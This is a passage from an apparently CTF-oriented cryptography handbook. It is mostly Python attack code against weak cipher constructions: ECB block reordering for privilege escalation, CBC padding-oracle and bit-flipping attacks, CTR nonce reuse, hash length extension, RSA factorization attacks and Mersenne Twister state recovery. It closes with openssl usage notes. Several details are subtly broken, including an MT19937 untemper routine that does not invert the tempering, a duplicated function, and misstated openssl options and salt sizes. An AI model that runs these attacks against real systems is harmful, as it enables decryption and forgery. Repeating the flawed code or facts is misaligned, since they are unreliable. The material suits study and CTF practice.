    issues = []
    
    # Check q size (should be 160 or 256 bits minimum)
    q_bits = q.bit_length()
    if q_bits < 160:
        issues.append(f'q too small: {q_bits} bits')
    
    # Check p size (should be 1024, 2048, or 3072 bits)
    p_bits = p.bit_length()
    if p_bits < 2048:
        issues.append(f'p too small: {p_bits} bits')
    
    # Verify q divides p-1
    if (p - 1) % q != 0:
        issues.append('q does not divide p-1')
    
    # Verify g^q mod p == 1
    if pow(g, q, p) != 1:
        issues.append('g^q mod p != 1')
    
    return issues
```

#### Stream Ciphers - Deprecated

**Weak PRNG-Based Stream Ciphers**

```python
import random

def weak_lcg_stream_cipher(seed, length):
    """
    Linear Congruential Generator (predictable)
    x_{n+1} = (a * x_n + c) mod m
    """
    # Weak parameters (commonly used but predictable)
    a = 1103515245
    c = 12345
    m = 2**31
    
    x = seed
    keystream = []
    
    for _ in range(length):
        x = (a * x + c) % m
        keystream.append(x & 0xFF)
    
    return bytes(keystream)

def attack_lcg(outputs):
    """
    Recover LCG parameters from output sequence
    """
    if len(outputs) < 3:
        return None
    
    # Truncated LCG attack
    # If we have x_0, x_1, x_2:
    # x_1 = (a * x_0 + c) mod m
    # x_2 = (a * x_1 + c) mod m
    
    x0, x1, x2 = outputs[0], outputs[1], outputs[2]
    
    # Solve for a and c (simplified for demonstration)
    # [Inference] Full attack requires more sophisticated algebra
    m = 2**31  # Assumed modulus
    
    try:
        t1 = (x2 - x1) % m
        t2 = (x1 - x0) % m
        a = (t1 * pow(t2, -1, m)) % m
        c = (x1 - a * x0) % m
        return {'a': a, 'c': c, 'm': m}
    except:
        return None

# Mersenne Twister state recovery
def mt19937_untemper(y):
    """
    Reverse Mersenne Twister tempering operation
    """
    y = y ^ (y >> 18)
    y = y ^ ((y << 15) & 0xefc60000)
    
    # Reverse y ^= (y << 7) & 0x9d2c5680
    y = y ^ ((y << 7) & 0x9d2c5680)
    y = y ^ ((y << 7) & 0x9d2c5680)
    y = y ^ ((y << 7) & 0x9d2c5680)
    y = y ^ ((y << 7) & 0x9d2c5680)
    
    # Reverse y ^= (y >> 11)
    y = y ^ (y >> 11)
    y = y ^ (y >> 11)
    
    return y & 0xffffffff
```

### Published Attacks by Cipher Type

#### Block Cipher Attacks

**ECB Mode - Block Reordering Attack**

```python
def ecb_cut_and_paste_attack(oracle_encrypt, oracle_decrypt):
    """
    Exploit ECB's deterministic encryption
    Create malicious ciphertext by rearranging blocks
    """
    # Example: Admin privilege escalation
    # Normal: email=user@test.com&role=user
    # Goal:   email=user@test.com&role=admin
    
    def craft_admin_payload():
        # Step 1: Create block containing "admin" + padding
        # Input: "email=AAAAAAAAAA" + "admin\x0b\x0b\x0b..." + "..."
        block_size = 16
        
        padding_len = block_size - len("email=")
        admin_block_input = "A" * padding_len + "admin" + "\x0b" * 11
        
        ct1 = oracle_encrypt(admin_block_input.encode())
        admin_block = ct1[block_size:block_size*2]
        
        # Step 2: Get normal user ciphertext
        # Input: "email=user@test.com&role="
        normal_input = "user@test.com"
        ct2 = oracle_encrypt(normal_input.encode())
        
        # Step 3: Combine blocks
        # Take first blocks of ct2, append admin_block
        malicious_ct = ct2[:block_size*2] + admin_block
        
        return malicious_ct
    
    return craft_admin_payload()

# ECB byte-at-a-time decryption
def ecb_decryption_oracle(oracle, block_size=16):
    """
    Decrypt unknown suffix appended by oracle
    """
    # Determine suffix length
    initial_len = len(oracle(b''))
    suffix_length = initial_len
    
    for i in range(1, block_size + 1):
        if len(oracle(b'A' * i)) > initial_len:
            suffix_length = initial_len - i
            break
    
    known_bytes = b''
    
    # Decrypt byte by byte
    for position in range(suffix_length):
        # Calculate padding needed
        padding_length = (block_size - 1 - (position % block_size))
        padding = b'A' * padding_length
        
        # Get target block
        target = oracle(padding)
        target_block_num = position // block_size
        target_block = target[target_block_num * block_size:(target_block_num + 1) * block_size]
        
        # Try all possible bytes
        for byte_val in range(256):
            test_input = padding + known_bytes + bytes([byte_val])
            test_output = oracle(test_input)
            test_block = test_output[target_block_num * block_size:(target_block_num + 1) * block_size]
            
            if test_block == target_block:
                known_bytes += bytes([byte_val])
                break
    
    return known_bytes
```

**CBC Mode - Padding Oracle Attack**

```python
def padding_oracle_decrypt_block(oracle, ciphertext, iv, block_size=16):
    """
    Decrypt single CBC block using padding oracle
    oracle(ct) returns True if padding valid
    """
    previous_block = iv
    current_block = ciphertext[:block_size]
    
    decrypted = bytearray(block_size)
    
    for pad_value in range(1, block_size + 1):
        # Attack from right to left
        for byte_guess in range(256):
            # Craft malicious IV
            test_iv = bytearray(block_size)
            
            # Set known bytes to produce correct padding
            for k in range(1, pad_value):
                test_iv[block_size - k] = decrypted[block_size - k] ^ pad_value
            
            # Set guess byte
            test_iv[block_size - pad_value] = byte_guess
            
            # Test with oracle
            if oracle(bytes(test_iv) + current_block):
                # Valid padding found
                decrypted[block_size - pad_value] = byte_guess ^ pad_value
                break
    
    # XOR with previous block to get plaintext
    plaintext = bytes([d ^ p for d, p in zip(decrypted, previous_block)])
    
    return plaintext

# CBC bit-flipping attack
def cbc_bit_flip_attack(ciphertext, iv, block_size=16):
    """
    Modify plaintext by flipping bits in previous ciphertext block
    """
    # Example: Change ";admin=false;" to ";admin=true;;"
    # Target is in block N, modify block N-1
    
    target_block = 2  # Block containing "admin=false"
    target_position = 6  # Position of 'f' in "false"
    
    # XOR relationship: P = D(C) XOR C_prev
    # To change P: C_prev' = C_prev XOR P_old XOR P_new
    
    modified_ct = bytearray(ciphertext)
    
    # Flip 'f' to 't': ord('f') ^ ord('t') = 0x66 ^ 0x74 = 0x12
    flip_mask = ord('f') ^ ord('t')
    
    prev_block_index = (target_block - 1) * block_size + target_position
    modified_ct[prev_block_index] ^= flip_mask
    
    # Also need to change 'alse' to 'rue;'
    # This demonstrates limitations - may corrupt other bytes
    
    return bytes(modified_ct)
```

**CTR Mode - Nonce Reuse Attack**

```python
from Crypto.Cipher import AES

def ctr_nonce_reuse_attack(ct1, ct2, known_plaintext1=None):
    """
    When nonce is reused in CTR mode:
    C1 = P1 XOR Keystream
    C2 = P2 XOR Keystream
    Therefore: C1 XOR C2 = P1 XOR P2
    """
    xored = bytes([b1 ^ b2 for b1, b2 in zip(ct1, ct2)])
    
    if known_plaintext1:
        # Recover P2 if P1 is known
        plaintext2 = bytes([x ^ p1 for x, p1 in zip(xored, known_plaintext1)])
        return plaintext2
    
    # Otherwise, return XORed plaintexts for analysis
    return xored

def ctr_keystream_recovery(ciphertexts, known_plaintexts):
    """
    Recover keystream from multiple CTR encryptions with same nonce
    """
    if len(ciphertexts) != len(known_plaintexts):
        return None
    
    # XOR ciphertext with known plaintext to get keystream
    keystream = bytes([c ^ p for c, p in zip(ciphertexts[0], known_plaintexts[0])])
    
    # Decrypt other ciphertexts
    recovered_plaintexts = []
    for ct in ciphertexts[1:]:
        pt = bytes([c ^ k for c, k in zip(ct, keystream)])
        recovered_plaintexts.append(pt)
    
    return keystream, recovered_plaintexts
```

#### Hash Function Attacks

**Length Extension Attack**

```python
import struct
import hashlib

def sha256_length_extension(original_hash, original_length, append_data, secret_length):
    """
    Extend SHA-256 hash without knowing secret
    Works on MD5, SHA-1, SHA-256, SHA-512 (Merkle-Damgård construction)
    Does NOT work on SHA-3 (sponge construction)
    """
    # Parse original hash as internal state
    h = [int(original_hash[i:i+8], 16) for i in range(0, len(original_hash), 8)]
    
    # Calculate padding for original message (secret + known)
    original_message_length = secret_length + original_length
    ml = original_message_length * 8
    
    # MD padding: message + 0x80 + zeros + length
    padding_length = (55 - original_message_length) % 64
    original_padding = b'\x80' + (b'\x00' * padding_length) + struct.pack('>Q', ml)
    
    # New message total length
    new_message_length = original_message_length + len(original_padding) + len(append_data)
    new_ml = new_message_length * 8
    
    # Continue hash from previous state
    # [Inference] This demonstrates the vulnerability principle
    # Actual implementation requires low-level SHA-256 operations
    
    return {
        'original_padding': original_padding,
        'new_data': original_padding + append_data,
        'new_length': new_message_length
    }

# Using hashpumpy library for practical attacks
def hashpump_attack(original_hash, original_data, append_data, key_length, algorithm='sha256'):
    """
    Practical length extension using hashpumpy
    """
    try:
        import hashpumpy
        
        new_hash, new_message = hashpumpy.hashpump(
            original_hash,
            original_data,
            append_data,
            key_length,
            algorithm=algorithm
        )
        
        return {
            'new_hash': new_hash,
            'new_message': new_message,
            'algorithm': algorithm
        }
    except ImportError:
        return "hashpumpy not installed: pip install hashpumpy"
```

**Collision Attacks**

```bash
# MD5 Collision Generation Tools

# HashClash - MD5 collision generation
git clone https://github.com/cr-marcstevens/hashclash
cd hashclash && make
./md5_fastcoll -p prefix.bin -o out1.bin out2.bin

# UniColl - Single-block MD5 collision
git clone https://github.com/corkami/collisions
cd collisions
python unicoll.py input.bin

# Verify collisions
md5sum out1.bin out2.bin

# SHA-1 Collision Detection
git clone https://github.com/cr-marcstevens/sha1collisiondetection
cd sha1collisiondetection && make
./sha1dcsum suspicious_file.pdf

# Create identical-prefix collision for PDFs
./build/md5_create_prefix attack --prefix common_prefix.pdf \
  --suffix1 variant1.pdf --suffix2 variant2.pdf
```

```python
# Collision-based certificate forgery detection
def detect_md5_collision_certificate(cert1_path, cert2_path):
    """
    Check if two certificates have MD5 collision
    """
    import hashlib
    
    with open(cert1_path, 'rb') as f1:
        cert1 = f1.read()
    with open(cert2_path, 'rb') as f2:
        cert2 = f2.read()
    
    md5_1 = hashlib.md5(cert1).hexdigest()
    md5_2 = hashlib.md5(cert2).hexdigest()
    sha256_1 = hashlib.sha256(cert1).hexdigest()
    sha256_2 = hashlib.sha256(cert2).hexdigest()
    
    result = {
        'md5_collision': md5_1 == md5_2 and cert1 != cert2,
        'sha256_collision': sha256_1 == sha256_2 and cert1 != cert2,
        'md5_1': md5_1,
        'md5_2': md5_2,
        'sha256_1': sha256_1,
        'sha256_2': sha256_2
    }
    
    return result

# Chosen-prefix collision demonstration
def chosen_prefix_collision_concept():
    """
    [Inference] Demonstrates collision types
    Actual generation requires specialized tools
    """
    return {
        'identical_prefix': 'Both messages start with same prefix',
        'chosen_prefix': 'Different prefixes, crafted collision blocks',
        'complexity_md5': '2^39 operations (practical)',
        'complexity_sha1': '2^63.1 operations (expensive but feasible)',
        'tools': ['HashClash', 'sha1collider']
    }
```

**Birthday Attack Implementation**

```python
import hashlib
import random

def birthday_attack_simulation(hash_func, output_bits, max_attempts=1000000):
    """
    Demonstrate birthday paradox in hash collisions
    Expected collisions: sqrt(2^n) = 2^(n/2)
    """
    seen_hashes = {}
    attempts = 0
    
    while attempts < max_attempts:
        # Generate random message
        message = random.randbytes(16)
        
        # Hash it (truncate to output_bits)
        hash_val = hash_func(message).digest()
        truncated = hash_val[:output_bits // 8]
        
        # Check for collision
        if truncated in seen_hashes:
            return {
                'collision_found': True,
                'attempts': attempts,
                'message1': seen_hashes[truncated],
                'message2': message,
                'hash': truncated.hex(),
                'expected_attempts': 2 ** (output_bits / 2)
            }
        
        seen_hashes[truncated] = message
        attempts += 1
    
    return {'collision_found': False, 'attempts': attempts}

# Truncated hash vulnerability
def analyze_truncated_hash(full_bits, truncated_bits):
    """
    Calculate collision probability for truncated hashes
    """
    import math
    
    full_security = 2 ** (full_bits / 2)
    truncated_security = 2 ** (truncated_bits / 2)
    
    return {
        'full_hash_bits': full_bits,
        'truncated_bits': truncated_bits,
        'full_collision_resistance': full_security,
        'truncated_collision_resistance': truncated_security,
        'security_reduction_factor': full_security / truncated_security,
        'warning': f'Truncation reduces security by {full_bits - truncated_bits} bits'
    }
```

#### RSA Attack Implementations

**Wiener's Attack (Small Private Exponent)**

```python
from fractions import Fraction
from Crypto.Util.number import long_to_bytes

def wieners_attack(n, e):
    """
    Attack RSA when d < n^0.25 / 3
    Uses continued fractions to find d
    """
    # Convert e/n to continued fraction
    convergents = continued_fractions(e, n)
    
    for k, d in convergents:
        if k == 0:
            continue
        
        # Check if this d works
        phi_n = (e * d - 1) // k
        
        # Solve x^2 - ((n - phi_n + 1))x + n = 0
        discriminant = (n - phi_n + 1) ** 2 - 4 * n
        
        if discriminant >= 0:
            sqrt_d = isqrt(discriminant)
            if sqrt_d * sqrt_d == discriminant:
                p = ((n - phi_n + 1) + sqrt_d) // 2
                q = ((n - phi_n + 1) - sqrt_d) // 2
                
                if p * q == n:
                    return {'p': p, 'q': q, 'd': d, 'method': 'Wiener'}
    
    return None

def continued_fractions(numerator, denominator):
    """
    Generate continued fraction convergents of numerator/denominator
    """
    convergents = []
    
    # Generate continued fraction coefficients
    cf = []
    while denominator:
        cf.append(numerator // denominator)
        numerator, denominator = denominator, numerator % denominator
    
    # Calculate convergents
    h0, h1 = 0, 1
    k0, k1 = 1, 0
    
    for a in cf:
        h = a * h1 + h0
        k = a * k1 + k0
        convergents.append((k, h))
        h0, h1 = h1, h
        k0, k1 = k1, k
    
    return convergents

def isqrt(n):
    """Integer square root"""
    if n < 0:
        raise ValueError("Square root of negative number")
    if n == 0:
        return 0
    
    x = n
    y = (x + 1) // 2
    while y < x:
        x = y
        y = (x + n // x) // 2
    return x
```

**Fermat's Factorization (Close Primes)**

```python
import gmpy2

def fermat_factorization(n, max_iterations=1000000):
    """
    Factor n when p and q are close: |p - q| is small
    Works when n = p*q and p ≈ q
    """
    a = gmpy2.isqrt(n) + 1
    b_squared = a * a - n
    
    for _ in range(max_iterations):
        if gmpy2.is_square(b_squared):
            b = gmpy2.isqrt(b_squared)
            p = a - b
            q = a + b
            
            if p * q == n:
                return {
                    'p': int(p),
                    'q': int(q),
                    'method': 'Fermat',
                    'iterations': _ + 1
                }
        
        a += 1
        b_squared = a * a - n
    
    return None

# Pollard's p-1 factorization
def pollards_p_minus_1(n, B=1000000):
    """
    Factor n when p-1 has only small prime factors
    """
    a = 2
    
    for j in range(2, B):
        a = pow(a, j, n)
        d = gmpy2.gcd(a - 1, n)
        
        if 1 < d < n:
            return {
                'factor': int(d),
                'method': 'Pollard p-1',
                'B': B,
                'j': j
            }
    
    return None

# Pollard's rho factorization
def pollards_rho(n, max_iterations=1000000):
    """
    General-purpose factorization for medium-sized n
    """
    x = 2
    y = 2
    d = 1
    
    def f(x):
        return (x * x + 1) % n
    
    iterations = 0
    while d == 1 and iterations < max_iterations:
        x = f(x)
        y = f(f(y))
        d = gmpy2.gcd(abs(x - y), n)
        iterations += 1
    
    if d != n:
        return {
            'factor': int(d),
            'method': 'Pollard rho',
            'iterations': iterations
        }
    
    return None
```

**Franklin-Reiter Related Message Attack**

```python
def franklin_reiter_attack(n, e, c1, c2, a=1, b=0):
    """
    Attack when two messages are linearly related:
    m2 = a*m1 + b (mod n)
    Both encrypted with same public key (n, e)
    """
    from sympy import symbols, Poly, gcd
    
    # Create polynomials
    x = symbols('x')
    
    # g1(x) = x^e - c1
    g1 = Poly(x**e - c1, x, domain='ZZ')
    
    # g2(x) = (ax + b)^e - c2
    g2 = Poly((a*x + b)**e - c2, x, domain='ZZ')
    
    # Compute GCD of polynomials modulo n
    # [Inference] This requires polynomial GCD over Z/nZ
    # Simplified implementation for demonstration
    
    def poly_gcd_mod(p1, p2, modulus):
        """GCD of polynomials modulo n"""
        while p2:
            p1, p2 = p2, p1 % p2
        return p1
    
    # The GCD should be (x - m1)
    # [Unverified] Full implementation requires advanced algebra libraries
    
    return {
        'method': 'Franklin-Reiter',
        'requirement': 'm2 = a*m1 + b',
        'note': 'Requires sympy or sage for polynomial GCD mod n'
    }

# Coppersmith's attack (polynomial roots mod n)
def coppersmith_short_pad_attack(n, e, c1, c2):
    """
    Attack when messages differ by small known padding
    m1 = m + r1, m2 = m + r2 where r1, r2 are small
    
    [Unverified] Requires sage mathematics for full implementation
    """
    return {
        'method': 'Coppersmith',
        'tool': 'SageMath',
        'command': 'small_roots() method on polynomial',
        'note': 'Best implemented in Sage, not pure Python'
    }
```

#### Elliptic Curve Attacks

**Invalid Curve Attack**

```python
def invalid_curve_attack_concept():
    """
    Send points not on the actual curve to extract private key bits
    Exploits implementations that don't validate points
    """
    return {
        'vulnerability': 'Missing point validation',
        'attack': 'Send point on curve with weak order',
        'result': 'Private key revealed through subgroup confinement',
        'mitigation': 'Always validate points are on curve',
        'example_curves': [
            'Curve25519 implementations without point validation',
            'Custom ECC implementations'
        ]
    }

# Small subgroup attack
def ecc_small_subgroup_attack_demo():
    """
    [Inference] Conceptual demonstration of small subgroup attack
    """
    attack_steps = [
        '1. Find curve with small subgroup order h',
        '2. Generate point P with order h',
        '3. Send P to victim, receive k*P',
        '4. Solve discrete log in small subgroup',
        '5. Repeat with different small orders',
        '6. Use CRT to recover full private key'
    ]
    
    return {
        'steps': attack_steps,
        'vulnerable_curves': 'Curves with large cofactor',
        'safe_curves': 'Curve25519 (cofactor = 8 but protected)',
        'tool': 'ecgen - generate weak curves'
    }
```

**MOV Attack (Weil/Tate Pairing)**

```bash
# Requires SageMath for pairing-based attacks
sage <<EOF
# Define elliptic curve
p = 12345678901234567890123456789
E = EllipticCurve(GF(p), [a, b])

# Check embedding degree
k = E.embedding_degree()
print(f"Embedding degree: {k}")

if k < 20:
    print("Vulnerable to MOV attack")
    # Transfer ECDLP to finite field DLP
else:
    print("Not vulnerable to MOV attack")
EOF
```

#### Stream Cipher Attacks

**Two-Time Pad (Keystream Reuse)**

```python
def two_time_pad_attack(ciphertexts):
    """
    Break XOR cipher when keystream is reused
    """
    # XOR all pairs of ciphertexts
    xor_results = []
    for i in range(len(ciphertexts)):
        for j in range(i + 1, len(ciphertexts)):
            xor_result = bytes([a ^ b for a, b in zip(ciphertexts[i], ciphertexts[j])])
            xor_results.append((i, j, xor_result))
    
    # Frequency analysis on XORed plaintexts
    def score_text(data):
        """Score based on English letter frequency"""
        score = 0
        for byte in data:
            if 32 <= byte <= 126:  # Printable ASCII
                score += 1
            if byte in b'etaoinshrdlu ETAOINSHRDLU':
                score += 2
        return score
    
    # Try to guess space positions (common in English)
    def find_spaces(xor_data):
        """Space XOR letter gives letter XOR 0x20"""
        potential_spaces = []
        for i, byte in enumerate(xor_data):
            # If xor is a letter, one plaintext likely has space
            if 65 <= byte <= 90 or 97 <= byte <= 122:
                potential_spaces.append(i)
        return potential_spaces
    
    results = []
    for i, j, xor_data in xor_results:
        spaces = find_spaces(xor_data)
        score = score_text(xor_data)
        results.append({
            'ct_indices': (i, j),
            'score': score,
            'potential_spaces': spaces[:10],  # First 10
            'xor_preview': xor_data[:50].hex()
        })
    
    return sorted(results, key=lambda x: x['score'], reverse=True)

# Crib dragging
def crib_drag(ciphertext, crib_list):
    """
    Drag known plaintext (crib) across ciphertext to find position
    """
    results = []
    
    for crib in crib_list:
        crib_bytes = crib.encode()
        
        for position in range(len(ciphertext) - len(crib_bytes)):
            # XOR crib with ciphertext at this position
            keystream_guess = bytes([c ^ p for c, p in zip(
                ciphertext[position:position+len(crib_bytes)],
                crib_bytes
            )])
            
            # Try to decrypt rest of message with this keystream
            if position + len(keystream_guess) < len(ciphertext):
                decrypted = bytes([c ^ k for c, k in zip(
                    ciphertext[position:position+len(keystream_guess)],
                    keystream_guess
                )])
                
                # Check if result looks like text
                if all(32 <= b <= 126 for b in decrypted):
                    results.append({
                        'crib': crib,
                        'position': position,
                        'keystream': keystream_guess.hex(),
                        'decrypted': decrypted.decode('ascii', errors='ignore')
                    })
    
    return results
```

**RC4 Keystream Bias Exploitation**

```python
def rc4_bias_analysis(ciphertexts, position=1):
    """
    Exploit known biases in RC4 keystream
    Position 1 (second byte) has bias toward 0
    """
    if position >= min(len(ct) for ct in ciphertexts):
        return None
    
    # Collect bytes at specific position
    bytes_at_position = [ct[position] for ct in ciphertexts]
    
    # Count frequency
    from collections import Counter
    frequency = Counter(bytes_at_position)
    
    # Expected most common XOR with 0 (since keystream byte 1 biased to 0)
    most_common_ct_byte = frequency.most_common(1)[0][0]
    
    # Guess plaintext byte at this position is most_common XOR 0
    guessed_keystream_byte = 0
    guessed_plaintext_byte = most_common_ct_byte ^ guessed_keystream_byte
    
    return {
        'position': position,
        'most_common_ciphertext_byte': hex(most_common_ct_byte),
        'frequency_count': frequency.most_common(5),
        'guessed_plaintext': chr(guessed_plaintext_byte) if 32 <= guessed_plaintext_byte <= 126 else None,
        'bias_strength': frequency[most_common_ct_byte] / len(ciphertexts)
    }

# PRNG state recovery from output
def crack_mt19937_from_output(outputs):
    """
    Recover Mersenne Twister state from 624 consecutive outputs
    """
    if len(outputs) < 624:
        return None
    
    # Untemper each output to get internal state
    state = [mt19937_untemper(y) for y in outputs[:624]]
    
    return {
        'state_recovered': True,
        'state_length': len(state),
        'note': 'Can now predict all future outputs'
    }

def mt19937_untemper(y):
    """
    Reverse MT19937 tempering operations
    """
    # Reverse y ^= (y >> 18)
    y = y ^ (y >> 18)
    
    # Reverse y ^= ((y << 15) & 0xefc60000)
    y = y ^ ((y << 15) & 0xefc60000)
    
    # Reverse y ^= ((y << 7) & 0x9d2c5680) - need to apply 4 times
    for _ in range(4):
        y = y ^ ((y << 7) & 0x9d2c5680)
    
    # Reverse y ^= (y >> 11) - need to apply twice
    y = y ^ (y >> 11)
    y = y ^ (y >> 11)
    
    return y & 0xffffffff
```

#### Timing Attack Implementations

**RSA Timing Attack**

```python
import time

def rsa_timing_attack_oracle(ciphertext, measure_function):
    """
    Measure decryption time to leak private key bits
    [Inference] Simplified concept - real attacks need statistical analysis
    """
    timings = []
    
    # Collect timing samples
    for _ in range(1000):
        start = time.perf_counter()
        measure_function(ciphertext)
        end = time.perf_counter()
        timings.append(end - start)
    
    import statistics
    return {
        'mean': statistics.mean(timings),
        'stdev': statistics.stdev(timings),
        'min': min(timings),
        'max': max(timings),
        'note': 'Analyze timing variations to infer key bits'
    }

# Constant-time comparison
def insecure_compare(a, b):
    """INSECURE: Leaks information through early return"""
    if len(a) != len(b):
        return False
    for x, y in zip(a, b):
        if x != y:
            return False  # Early return leaks position
    return True

def secure_compare(a, b):
    """Secure: Constant-time comparison"""
    if len(a) != len(b):
        return False
    
    result = 0
    for x, y in zip(a, b):
        result |= x ^ y  # Always check all bytes
    
    return result == 0
```

**Cache Timing Attacks**

```python
def cache_timing_attack_concept():
    """
    [Inference] Demonstrates attack principle
    Actual implementation requires low-level CPU access
    """
    return {
        'attack_type': 'Cache Timing Side Channel',
        'targets': ['AES T-table implementations', 'RSA modular exponentiation'],
        'techniques': {
            'Flush+Reload': 'clflush instruction + timing',
            'Prime+Probe': 'Fill cache sets, measure eviction',
            'Evict+Time': 'Evict specific lines, time access'
        },
        'tools': ['Mastik', 'FLUSH+RELOAD toolkit'],
        'mitigations': ['Constant-time algorithms', 'Cache-resistant implementations'],
        'note': '[Unverified] Success depends on CPU architecture and system noise'
    }
```

### Cipher Weakness Summary Table

```python
def generate_weakness_database():
    """
    Comprehensive cipher weakness reference
    """
    return {
        'symmetric_ciphers': {
            'DES': {
                'key_size': 56,
                'status': 'BROKEN',
                'attacks': ['Brute force (practical)', 'Weak keys', 'Linear cryptanalysis'],
                'tools': ['John the Ripper', 'hashcat'],
                'replacement': 'AES'
            },
            '3DES': {
                'key_size': 112 ,  # effective for 2-key
                'status': 'DEPRECATED',
                'attacks': ['Sweet32 (birthday)', 'Meet-in-the-middle'],
                'block_size': 64,
                'replacement': 'AES'
            },
            'RC4': {
                'type': 'stream',
                'status': 'BROKEN',
                'attacks': ['Keystream bias', 'Fluhrer-Mantin-Shamir', 'RC4-NOMORE'],
                'tools': ['rc4_crack'],
                'replacement': 'ChaCha20'
            },
            'Blowfish': {
                'block_size': 64,
                'status': 'DEPRECATED',
                'attacks': ['Sweet32', 'Weak key classes'],
                'replacement': 'AES or Twofish'
            }
        },
        'hash_functions': {
            'MD5': {
                'output_bits': 128,
                'status': 'BROKEN',
                'attacks': ['Collision (practical)', 'Preimage (theoretical)', 'Length extension'],
                'tools': ['HashClash', 'md5_fastcoll'],
                'replacement': 'SHA-256'
            },
            'SHA-1': {
                'output_bits': 160,
                'status': 'DEPRECATED',
                'attacks': ['Collision (practical 2017)', 'Length extension'],
                'tools': ['sha1collider', 'shattered'],
                'replacement': 'SHA-256'
            }
        },
        'asymmetric_ciphers': {
            'RSA': {
                'weak_conditions': [
                    'e < 65537',
                    'd < n^0.25',
                    'p and q close together',
                    'Common modulus',
                    'p-1 or q-1 smooth'
                ],
                'attacks': [
                    'Small e attack',
                    'Wiener attack',
                    'Fermat factorization',
                    'Pollard p-1',
                    'Hastad broadcast'
                ],
                'minimum_key_size': 2048
            },
            'DSA': {
                'weak_conditions': ['Nonce reuse', 'Weak PRNG', 'Short q'],
                'attacks': ['Nonce recovery', 'Lattice attacks'],
                'minimum_param_size': {'p': 2048, 'q': 256}
            },
            'ECDSA': {
                'weak_conditions': ['Nonce reuse', 'Nonce bias', 'Invalid curve'],
                'attacks': ['Biased nonce attack', 'Invalid curve attack'],
                'safe_curves': ['secp256r1', 'Curve25519', 'secp256k1']
            }
        },
        'modes_of_operation': {
            'ECB': {
                'status': 'INSECURE',
                'attacks': ['Block shuffling', 'Plaintext leakage', 'Pattern detection'],
                'note': 'Never use for anything'
            },
            'CBC': {
                'status': 'DEPRECATED',
                'attacks': ['Padding oracle', 'IV manipulation', 'Bit flipping'],
                'note': 'Requires careful padding validation'
            },
            'CTR': {
                'status': 'SECURE',
                'weak_conditions': ['Nonce reuse'],
                'attacks': ['Keystream reuse if nonce repeated']
            },
            'GCM': {
                'status': 'SECURE',
                'weak_conditions': ['Nonce reuse (catastrophic)', 'Short tags'],
                'note': 'Never reuse nonce with same key'
            }
        }
    }

# Print formatted weakness report
def print_cipher_analysis(cipher_name, database):
    """Generate CTF-ready cipher analysis"""
    for category, ciphers in database.items():
        if cipher_name in ciphers:
            info = ciphers[cipher_name]
            print(f"\n=== {cipher_name} Analysis ===")
            for key, value in info.items():
                print(f"{key}: {value}")
            return
    print(f"Cipher {cipher_name} not found in database")
```

**Important CTF Resources:**

- **RsaCtfTool**: `git clone https://github.com/Ganapati/RsaCtfTool.git` - Automated RSA attack tool
- **HashClash**: MD5 collision generation framework
- **PyCryptodome**: `pip install pycryptodome` - Comprehensive crypto library
- **SageMath**: Advanced mathematical attacks (ECC, polynomial attacks)
- **John the Ripper**: Hash cracking with custom rules
- **Hashcat**: GPU-accelerated hash cracking

**Disclaimer:** [Unverified] Attack success rates vary significantly based on key parameters, implementation details, and available computational resources. The examples demonstrate attack principles; actual CTF challenges may require adaptation and combination of multiple techniques.

---

# KALI LINUX TOOL ECOSYSTEM

## Pre-installed Cryptographic Tools

### `openssl`

OpenSSL is a cryptographic toolkit providing symmetric encryption, asymmetric encryption, hashing, certificate management, and SSL/TLS protocol operations. It's fundamental for CTF cryptography challenges involving encryption, decryption, and protocol analysis.

##### Symmetric Encryption

Encrypt plaintext with AES-256-CBC:

```bash
openssl enc -aes-256-cbc -in plaintext.txt -out encrypted.bin -S $(openssl rand -hex 8) -md sha256
```

The `-S` option specifies a salt (8 hex characters = 4 bytes); `$(openssl rand -hex 8)` generates random salt. `-md sha256` specifies the key derivation function. Prompt for password interactively:

```bash
openssl enc -aes-256-cbc -in plaintext.txt -out encrypted.bin -md sha256
```

OpenSSL prompts for a password. Avoid storing passwords in command history.

Decrypt:

```bash
openssl enc -aes-256-cbc -d -in encrypted.bin -out decrypted.txt -md sha256
```

The `-d` flag toggles decryption mode. Enter the same password used during encryption.

Specify key and IV directly (useful for CTF scenarios with known credentials):

```bash
openssl enc -aes-256-cbc -K 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef -iv 0123456789abcdef -in plaintext.txt -out encrypted.bin -nopad
```

`-K` specifies key as hex (32 bytes for AES-256). `-iv` specifies initialization vector as hex (16 bytes). `-nopad` disables PKCS#7 padding (use only if plaintext length is multiple of 16 bytes).

Other cipher algorithms:

```bash
openssl enc -aes-128-ecb -in plaintext.txt -out encrypted.bin
openssl enc -des3-cbc -in plaintext.txt -out encrypted.bin
openssl enc -bf-cbc -in plaintext.txt -out encrypted.bin
```

List available ciphers:

```bash
openssl enc -list
```

##### Asymmetric Encryption (RSA)

Generate RSA key pair (2048-bit):

```bash
openssl genrsa -out private.pem 2048
```

Extract public key:

```bash
openssl rsa -in private.pem -pubout -out public.pem
```

Encrypt plaintext with public key:

```bash
openssl rsautl -encrypt -inkey public.pem -pubin -in plaintext.txt -out encrypted.bin
```

Decrypt with private key:

```bash
openssl rsautl -decrypt -inkey private.pem -in encrypted.bin -out decrypted.txt
```

For large files (RSA cannot directly encrypt files larger than key size minus padding), use hybrid encryption:

```bash
# Generate random symmetric key
openssl rand 32 > symmetric.key

# Encrypt file with symmetric key
openssl enc -aes-256-cbc -in largefile.txt -out largefile.enc -K $(xxd -p -l 32 symmetric.key) -S 0000000000000000 -md sha256 -nopad

# Encrypt symmetric key with RSA public key
openssl rsautl -encrypt -inkey public.pem -pubin -in symmetric.key -out symmetric.key.enc

# Decrypt (reverse process)
openssl rsautl -decrypt -inkey private.pem -in symmetric.key.enc -out symmetric.key.dec
openssl enc -aes-256-cbc -d -in largefile.enc -out largefile.dec -K $(xxd -p -l 32 symmetric.key.dec) -S 0000000000000000 -md sha256 -nopad
```

##### Hashing and Message Digests

Generate hash digests:

```bash
openssl dgst -sha256 file.txt
openssl dgst -md5 file.txt
openssl dgst -sha512 file.txt
```

Output format: `SHA2-256(file.txt)= abcd1234...`

For password hashing (bcrypt-like alternatives use `crypt`):

```bash
openssl passwd -crypt plaintext_password
openssl passwd -1 plaintext_password
```

`-crypt` uses traditional DES-based crypt (legacy). `-1` uses MD5-based hashing (also legacy, not recommended for new systems). For bcrypt:

```bash
openssl passwd -6 plaintext_password
```

The `-6` option uses SHA-512-based crypt (glibc extension).

HMAC generation:

```bash
openssl dgst -sha256 -hmac "secret_key" file.txt
echo -n "message" | openssl dgst -sha256 -hmac "secret_key"
```

Verify HMAC by recomputing:

```bash
known_hmac="abcd1234..."
